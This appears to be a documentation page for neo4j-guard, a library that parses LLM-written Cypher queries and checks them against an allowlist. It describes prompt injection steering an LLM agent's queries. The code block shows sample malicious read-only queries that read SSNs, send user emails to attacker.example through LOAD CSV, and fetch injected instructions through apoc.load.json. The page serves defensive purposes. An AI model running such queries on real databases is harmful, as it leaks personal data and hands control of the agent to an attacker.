---
title: Why neo4j-guard?
description: neo4j-guard is designed as an agent guardrail. It blocks unsafe queries that read-only connections still allow, such as LOAD CSV and APOC procedures. Compatible with Neo4j Community Edition, Enterprise Edition, and Aura.
sidebar_position: 2
---

`neo4j-guard` is designed as an agent guardrail. LLM-generated Cypher is untrusted input. An LLM writes Cypher from the text it is given: user messages, retrieved documents, and data from the graph itself. Any of that text can carry instructions, so anyone who can put text in front of the LLM can change the query it writes. The query then runs with the permissions of the database connection.

Read-only does not stop malicious queries. The usual defense is to make the connection read-only, but this is not available to Community Edition users. Either way, read-only only blocks writes, but a query does not need to write to do damage. Each of these malicious queries can run with read-only permissions:

```cypher
// Reads a property the LLM should not see
MATCH (p:Person) RETURN p.name, p.ssn

// Sends every user's email to another server
MATCH (u:User) LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row RETURN row

// Fetches new instructions for the LLM from another server
CALL apoc.load.json('https://attacker.example/prompt.json') YIELD value RETURN value
```

Therefore, it is important to check every query before it runs. `neo4j-guard` fully parses each query into a syntax tree with Neo4j's own Cypher 25 grammar and checks every query against an allowlist before Neo4j sees it. It takes one call on the driver, with no server changes, and it works on Community Edition, Enterprise Edition, and Aura:

```python
from neo4j import GraphDatabase
from neo4j_guard import guard

driver = guard(
    GraphDatabase.driver(URL, auth=AUTH),
    mode="read", # default configuration blocks most malicious queries
    disallow=["Person.ssn"],
)
```

A blocked query raises `GuardError`, and the message says what was blocked, so the LLM can rewrite the query. To install it and guard a driver, follow the [Quick start](./quick-start.md).